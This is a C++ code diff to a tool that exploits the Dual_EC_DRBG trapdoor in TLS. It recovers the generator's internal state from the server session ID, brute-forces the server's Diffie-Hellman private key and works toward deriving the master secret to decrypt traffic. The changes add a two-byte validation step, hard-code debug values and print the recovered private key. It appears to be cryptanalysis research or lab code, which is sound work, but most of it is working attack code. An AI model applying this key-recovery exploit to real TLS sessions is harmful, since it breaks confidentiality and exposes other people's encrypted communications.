@@ -1,5 +1,6 @@
 #include "commons.h"
 #include "bitstr.h"
+#include "forward.h"
 #include "input.h"
 #include "dualec_curve.h"
 #include "mbedtls/cipher.h"
@@ -22,7 +23,7 @@
 constexpr auto MASTER_SECRET_LEN = 48;
 
 static auto* cipher_info = mbedtls_cipher_info_from_type(MBEDTLS_CIPHER_CHACHA20_POLY1305);
-static BigInt no_of_threads = 28;
+static BigInt no_of_threads = 1;
 
 barr expect_premaster ={0xdb, 0x39, 0xe0, 0xb2, 0x91, 0x1c, 0x20, 0x7d, 0xdb, 0xf5, 0x2d, 0x6a, 0xac, 0x47, 0x29, 0xdf, 0xfe, 0x41, 0x70, 0xf0, 0x32, 0xe5, 0x55, 0x0d, 0x4f, 0x73, 0x94, 0xcc, 0xc3, 0x40, 0x7f, 0xf9, 0xcc, 0x15, 0x4a, 0x43, 0xa3, 0x4e, 0xbc, 0xe1, 0x52, 0x43, 0x8f, 0x8e, 0xc8, 0x68, 0x5d, 0x46, 0x0e, 0x0f, 0x48, 0x7d, 0x3f, 0x4f, 0x18, 0x24, 0x78, 0xf9, 0x8b, 0x7e, 0x56, 0x57, 0xa0, 0xca, 0xe9, 0x92, 0xa1, 0xec, 0xde, 0xe6, 0x1b, 0xab, 0xfb, 0x98, 0x9a, 0x89, 0xf1, 0x30, 0xb6, 0x79, 0xaf, 0x15, 0x67, 0x07, 0xe6, 0x09, 0x86, 0x90, 0xc0, 0x16, 0xa6, 0xf6, 0x22, 0x6d, 0x68, 0x05, 0x39, 0xba, 0x80, 0x1e, 0x78, 0xfc, 0x86, 0xce, 0xc0, 0xe7, 0xf6, 0xb3, 0x5e, 0xdb, 0xcc, 0x96, 0xfa, 0x24, 0x2c, 0xe1, 0x4f, 0x29, 0x24, 0xfc, 0xd1, 0x9d, 0xb4, 0x92, 0xe3, 0xd0, 0x01, 0xad, 0xc6, 0x39, 0xa5, 0x30, 0x47, 0x9b, 0x00, 0x6a, 0xe0, 0xa2, 0xa6, 0xc7, 0x15, 0xd9, 0x2f, 0xd8, 0x74, 0xd3, 0xd3, 0x9c, 0xb8, 0x54, 0xb7, 0x4e, 0x6c, 0xc0, 0x1e, 0xd4, 0x50, 0x47, 0x1c, 0x47, 0x2e, 0x6c, 0xb2, 0x09, 0x8b, 0xfb, 0x23, 0x2f, 0x19, 0x33, 0xde, 0xe5, 0x0a, 0xa8, 0x68, 0xfd, 0xf9, 0x63, 0x1f, 0x9f, 0x47, 0xdc, 0x2b, 0x5c, 0x24, 0x2b, 0x9b, 0x7d, 0xdd, 0xe2, 0x59, 0x76, 0x60, 0x8a, 0x3e, 0xf4, 0x91, 0xbe, 0xa6, 0x53, 0x8f, 0xcf, 0xa3, 0xa3, 0xd3, 0x97, 0xf5, 0xdf, 0x31, 0xaa, 0xc4, 0x42, 0x51, 0x25, 0xda, 0xe7, 0x8b, 0xfa, 0xcc, 0x02, 0xed, 0x9e, 0x35, 0x04, 0xee, 0xef, 0x3b, 0x63, 0x5c, 0xa7, 0x88, 0x84, 0x84, 0xfd, 0xab, 0x22, 0x96, 0x2b, 0x6d, 0xdb, 0x87, 0xf9, 0x37, 0x0f, 0xe8, 0x18, 0x39, 0x15, 0x7d, 0x24, 0xb5, 0x59, 0x13, 0x34, 0x49, 0x56};
 barr expect_master_secret={0xac, 0xbe, 0x54, 0x3f, 0x17, 0x2f, 0xcf, 0x9a, 0x8a, 0x47, 0x97, 0xdc, 0x24, 0xc4, 0xc0, 0x2e, 0x6b, 0x22, 0xeb, 0x45, 0x9d, 0x4a, 0x0f, 0x17, 0x87, 0xed, 0x54, 0x13, 0x21, 0xce, 0x11, 0x4b, 0x7f, 0xea, 0xb0, 0x20, 0x3f, 0x4a, 0x43, 0x3d, 0x7e, 0xc3, 0x70, 0x5e, 0xdd, 0x1a, 0x6f, 0x90};
@@ -228,20 +229,24 @@ BitStr bitstr_from_barr(barr input)
 {
     BitStr out = BitStr(0);
     for (auto const& b : input)
-        out = out + BitStr(BigInt(b));
+        out = out + BitStr(BigInt(b), 8);
     return out;
 }
 
-std::optional<BigInt> try_calc_private_key(BitStr const& guessed_stripped_bits, BitStr const& guessed_last4, BitStr const& inner_dec_serv_rand, Input const& input, DEC::WorkingState& working_state)
+std::optional<BigInt> try_calc_private_key(BitStr const& guessed_stripped_bits, BitStr const& validify_bits, BitStr const& inner_dec_serv_rand, Input const& input, DEC::WorkingState& working_state)
 {
-    BitStr guessed_r = guessed_stripped_bits + inner_dec_serv_rand + guessed_last4;
-    guessed_r = BitStr(BigInt("4114821914257836427412383736423926738535236367829896912322074519093614918422"), 32*8);
+    BitStr guessed_r = /*guessed_stripped_bits*/BitStr(BigInt(0xdd00)) + inner_dec_serv_rand;
     /* Step 3: Calculate the next state s_(i+1) */
     BitStr s_opt1 = BitStr(0), s_opt2 = BitStr(0);
     calculate_s_from_r(s_opt1, s_opt2, guessed_r.as_big_int(), input);
 
     for (auto const& s : {s_opt1, s_opt2}) {
         working_state.s = BitStr(std::move(s));
+        /* Step 3.1: Generate server-session-id last 2 bytes */
+        auto to_validify = DEC::Generate(working_state, 2*8, {} /* in between, so adin=0 internally */);
+        if (to_validify.as_big_int() != validify_bits.as_big_int())
+            continue;
+        std::cout << "Possible s found: " << s.as_hex_string() << std::endl;
         /* Step 4: Generate enough random bits for a. Calculate a by subtracting 1 from the bits */
         auto a_bits = DEC::Generate(working_state, input.dh_bitlen_of_a, input.dec_adin);
         auto a = a_bits.as_big_int() - 1;
@@ -281,18 +286,16 @@ static void push_worker(std::function<std::optional<BitStr>()> func)
     workers.push(std::async(std::launch::async, func));
 }
 
-BigInt guess_server_private_key(BitStr const& inner_dec_serv_rand, Input const& input)
+BigInt guess_server_private_key(BitStr const& inner_dec_serv_rand, BitStr const& validify_bits, Input const& input)
 {
     std::stop_source stop_source;
 
     auto stripped_amount_of_bits = DEC::pick_seedlen(input.dec_security_strength) - DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength));
-    auto amount_unix_time_stripped = 0; // TODO: 4*8;
-    auto full_amound_stripped = stripped_amount_of_bits + amount_unix_time_stripped;
 
-    std::cout << "Amount of bits to brute force: " << full_amound_stripped << std::endl;
+    std::cout << "Amount of bits to brute force: " << stripped_amount_of_bits << std::endl;
     /* Step 2: Guess the last 4 bytes (because they were stripped to make room for the unix timestamp)
      *         and the stripped bits from the front */
-    auto strip_bound = BigInt(1) << full_amound_stripped;
+    auto strip_bound = BigInt(1) << stripped_amount_of_bits;
     auto strip_per_thread = strip_bound / no_of_threads;
 
     progess.resize(no_of_threads);
@@ -300,7 +303,7 @@ BigInt guess_server_private_key(BitStr const& inner_dec_serv_rand, Input const& 
     auto* progress_bucket = &progess[0];
     auto* finish_bucket = &finished_worker[0];
     for (BigInt thread_start(0), thread_end(strip_per_thread); thread_end <= strip_bound; thread_end += strip_per_thread, thread_start += strip_per_thread, ++progress_bucket, ++finish_bucket) {
-        auto lambda = [progress_bucket,finish_bucket, amount_unix_time_stripped, &stop_source, thread_start, thread_end, full_amound_stripped, stripped_amount_of_bits, &inner_dec_serv_rand, &input]() -> std::optional<BitStr> {
+        auto lambda = [&validify_bits, progress_bucket,finish_bucket, &stop_source, thread_start, thread_end, stripped_amount_of_bits, &inner_dec_serv_rand, &input]() -> std::optional<BitStr> {
              auto working_state = DEC::WorkingState {
                 .s = BitStr(-1),
                 .seedlen = DEC::pick_seedlen(input.dec_security_strength),
@@ -310,10 +313,9 @@ BigInt guess_server_private_key(BitStr const& inner_dec_serv_rand, Input const& 
             auto stoken = stop_source.get_token();
             while (guesser.has_next() && !stoken.stop_requested()) {
                 *progress_bucket = guesser.percentage();
-                auto guess = BitStr(guesser.advance(), full_amound_stripped);
-                BitStr guessed_last4 = guess.truncated_leftmost(amount_unix_time_stripped);
+                auto guess = BitStr(guesser.advance(), stripped_amount_of_bits);
                 BitStr guessed_stripped_bits = guess.truncated_rightmost(stripped_amount_of_bits);
-                auto result = try_calc_private_key(guessed_stripped_bits,guessed_last4, inner_dec_serv_rand, input, working_state);
+                auto result = try_calc_private_key(guessed_stripped_bits, validify_bits, inner_dec_serv_rand, input, working_state);
                 if (result.has_value()) {
                     stop_source.request_stop();
                     *finish_bucket = 1;
@@ -364,17 +366,18 @@ int main()
 {
     auto input = setup_input();
     /* Input:
-     *      TLS: server-random, client-random,
+     *      TLS: server-random, client-random, server-session-id
      *      DH: generator, prime, bitlength of a (TODO: not transferred, but maybe inferred?), pubKeyServer = g^a (mod p), pubKeyClient = g^b (mod p).
      *      DualEC: security-stength, Q, d, s.t. dQ = P, adins used for generating, personalization string
      * Assumption:
      *      server used DualEC to generate server-random and (a+1),
      *      for now: used cipher: MBEDTLS_CIPHER_CHACHA20_POLY1305
      */
-    /* Step 1: Strip the first 4 bytes of server-random, because it's the unix timestamp. */
-    BitStr inner_dec_serv_rand = bitstr_from_barr(barr(input.server_random.begin() /*+ 4+*/, input.server_random.end()));
-    BigInt server_private = guess_server_private_key(inner_dec_serv_rand, input);
-    std::cout << "SUCCESS!!!" << std::endl;
+    /* Step 1: Take the first 30 bytes of server-session-id (for 128 security strength) */
+    BitStr inner_dec_serv_rand = bitstr_from_barr(barr(input.server_session_id.begin(), input.server_session_id.begin() + 30));
+    BitStr validify_bits = bitstr_from_barr(barr(input.server_session_id.begin() + 30, input.server_session_id.begin() + 32));
+    BigInt server_private = guess_server_private_key(inner_dec_serv_rand, validify_bits, input);
+    std::cout << "SUCCESS!!! server private key is:\n\t" << bigint_hex(server_private) << std::endl;
     /* Step 6: Calculate the pre-master-secret with pubKeyClient^a (mod p) */
     /* Step 7: Calculate the master secret with the given information */
     /* Step 8: Calculate the working_keys and decrpyt the message */
